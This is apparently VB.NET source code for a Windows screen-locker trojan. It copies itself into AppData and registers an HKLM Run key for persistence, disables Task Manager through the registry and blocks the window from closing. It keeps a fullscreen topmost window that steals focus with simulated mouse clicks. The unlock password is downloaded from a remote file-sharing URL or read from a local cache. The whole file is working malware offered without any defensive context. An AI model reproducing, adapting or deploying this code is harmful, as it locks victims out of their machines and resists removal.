﻿Imports System.Runtime.InteropServices
Public Class frmMain
    ''Important declarations
    '
    Dim sr As System.IO.StreamReader
    Dim WithEvents wc As New System.Net.WebClient

    'left mouse button
    Private Declare Sub mouse_event Lib "user32" (ByVal dwFlags As Long, ByVal dx As Long, ByVal dy As Long, ByVal cButtons As Long, ByVal dwExtraInfo As Long)

    'some global variables
    Dim structurePath As String = System.Environment.GetFolderPath(System.Environment.SpecialFolder.ApplicationData) & "\" & CompanyName & "\" & ProductName & "\"
    Dim quitAllow As Byte = 0 '0/1, 1 - program can be terminated, 0 - program can not
    Dim modeTrojan As Byte = 0 '0/1
    Dim btsoUrl As String = "https://preview.cubby.com/pl/BtsO_password.txt/_6c3d09bccd7e43ce9537bb09c4823006"
    Dim svt_you_may_pass_b As String = "12369877896321555"
    Dim svt_you_may_pass As String = svt_you_may_pass_b
    Dim txtboxWasChanged As Byte = 0 '0/1, 1 - prohibit program to load new pass, 0 - do nothing

    'beautiful form background
    <Runtime.InteropServices.StructLayout(Runtime.InteropServices.LayoutKind.Sequential)> Public Structure MARGINS
        Public LeftWidth As Integer
        Public RightWidth As Integer
        Public TopHeight As Integer
        Public Buttomheight As Integer
    End Structure
    <Runtime.InteropServices.DllImport("dwmapi.dll")> Public Shared Function DwmExtendFrameIntoClientArea(ByVal hWnd As IntPtr, ByRef pMarinset As MARGINS) As Integer
    End Function

    'random for position
    'Dim rndValX As Short = 0
    'Dim rndValY As Short = 0
    'Public Function GetRandom(ByVal Min As Integer, ByVal Max As Integer) As Integer
    '    Static Generator As System.Random = New System.Random()
    '    Return Generator.Next(Min, Max)
    'End Function
    ''

    ''FIXES:
    '
    'fix2 - no exit except from task manager and program method
    Private Sub frmMain_FormClosing(ByVal sender As Object, ByVal e As System.Windows.Forms.FormClosingEventArgs) Handles Me.FormClosing
        If Not quitAllow = 1 Then e.Cancel = True
    End Sub
    ''

    ''Loads the main function
    '
    Private Sub frmMain_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        'beautiful form background
        Try
            Me.TransparencyKey = Color.Cyan 'USE THIS COLOUR ONLY HERE (or change it)
            Me.BackColor = Color.Cyan 'USE THIS COLOUR ONLY HERE (or change it)
            Dim margins As MARGINS = New MARGINS
            margins.LeftWidth = -1
            margins.RightWidth = -1
            margins.TopHeight = -1
            margins.Buttomheight = -1
            Dim result As Integer = DwmExtendFrameIntoClientArea(Me.Handle, margins)
        Catch ex As Exception
            MsgBox("I just don't know what went wrong ◴_◶" & Err.Description, vbCritical, "Fatal Error")
            Application.Exit()
        End Try

        'fs
        IO.Directory.CreateDirectory(structurePath)
        If IO.Directory.Exists("svt_structure") = True Then My.Computer.FileSystem.MoveDirectory("svt_structure", structurePath, True)

        'copy itself to fs folder
        If Not My.Computer.FileSystem.FileExists(structurePath & My.Application.Info.AssemblyName & ".exe") = True Then
            My.Computer.FileSystem.CopyFile(Application.ExecutablePath, structurePath & My.Application.Info.AssemblyName & ".exe")
        Else
            Dim Info As FileVersionInfo
            Info = FileVersionInfo.GetVersionInfo(structurePath & My.Application.Info.AssemblyName & ".exe")
            If Not ProductVersion = Info.ProductVersion Then
                My.Computer.FileSystem.CopyFile(Application.ExecutablePath, structurePath & My.Application.Info.AssemblyName & ".exe", True)
            End If
        End If
        'autorun
        My.Computer.Registry.SetValue("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\", ProductName, structurePath & My.Application.Info.AssemblyName & ".exe")

        'random for position
        'rndValX = GetRandom(Screen.PrimaryScreen.Bounds.Height / 10, Screen.PrimaryScreen.Bounds.Width / 2)
        'rndValY = GetRandom(Screen.PrimaryScreen.Bounds.Height / 10, Screen.PrimaryScreen.Bounds.Width / 2)
        'rndValX = GetRandom(0, Screen.PrimaryScreen.Bounds.Width)
        'rndValY = GetRandom(0, Screen.PrimaryScreen.Bounds.Height)
        'TextBox1.Location = New Point(rndValX, rndValY)

        'fit the width
        Me.Size = New Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height)
        Me.Location = New Point(0, 0)
        TextBox1.Size = New Size(Screen.PrimaryScreen.WorkingArea.Width, 20)

        'to the right screen corner #1
        'Dim x As Integer
        'Dim y As Integer
        'x = Screen.PrimaryScreen.WorkingArea.Width
        'y = Screen.PrimaryScreen.WorkingArea.Height - TextBox1.Height
        'Do Until x = Screen.PrimaryScreen.WorkingArea.Width - TextBox1.Width
        '    x = x - 1
        '    TextBox1.Location = New Point(x, y)
        'Loop

        'to the right screen corner #2
        Dim x As Integer
        Dim y As Integer
        x = Screen.PrimaryScreen.WorkingArea.Width - TextBox1.Width
        y = Screen.PrimaryScreen.WorkingArea.Height - TextBox1.Height
        TextBox1.Location = New Point(x, y)

        'disable task manager
        My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\", "DisableTaskMgr", 1)
    End Sub
    ''

    ''Main function
    '
    Private Sub TextBox1_TextChanged(sender As Object, e As EventArgs) Handles TextBox1.TextChanged
        If txtboxWasChanged = 0 Then
            If modeTrojan = 1 Then
                svt_you_may_pass = wc.DownloadString(New Uri(btsoUrl))
                If svt_you_may_pass = " " Then svt_you_may_pass = svt_you_may_pass_b
            Else
                If My.Computer.FileSystem.FileExists(structurePath & "cache.dat") = True Then
                    sr = New IO.StreamReader(structurePath & "cache.dat")
                    svt_you_may_pass = sr.ReadLine()
                    sr.Close()
                    If svt_you_may_pass = " " Then svt_you_may_pass = svt_you_may_pass_b
                End If
            End If
        End If

        txtboxWasChanged = 1

        If TextBox1.Text = svt_you_may_pass Then
            'enable task manager
            My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\", "DisableTaskMgr", 0)

            'no autorun
            If modeTrojan = 1 Then
                Dim svt As Microsoft.Win32.RegistryKey = My.Computer.Registry.LocalMachine.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True)
                svt.DeleteValue(ProductName, False)
            End If

            quitAllow = 1
            Application.Exit()
        End If

    End Sub
    ''

    ''Some tricks
    '
    'to avoid being exploited #
    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Me.TopMost = True
        mouse_event(&H2, 850, 13, 0, 0) 'LMB hold
        mouse_event(&H4, 850, 13, 0, 0) 'LMB release
        TextBox1.Focus()
    End Sub
    ''
End Class
